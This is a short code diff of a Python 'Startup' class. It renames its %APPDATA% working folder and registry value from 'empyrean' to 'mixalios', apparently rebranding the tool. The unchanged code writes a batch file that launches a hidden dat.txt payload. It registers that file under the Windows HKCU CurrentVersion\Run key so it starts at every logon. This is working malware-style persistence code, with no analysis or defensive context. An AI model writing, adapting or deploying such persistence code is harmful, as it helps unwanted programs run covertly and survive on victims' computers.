@@ -5,7 +5,7 @@ import sys
 
 class Startup:
     def __init__(self) -> None:        
-        self.working_dir = os.getenv("APPDATA") + "\\empyrean"
+        self.working_dir = os.getenv("APPDATA") + "\\mixalios"
     
         if self.check_self():
             return
@@ -35,5 +35,5 @@ class Startup:
             f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
     
     def regedit(self) -> None:
-        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/f"], shell=True)
-        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
+        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "mixalios", "/f"], shell=True)
+        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "mixalios", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
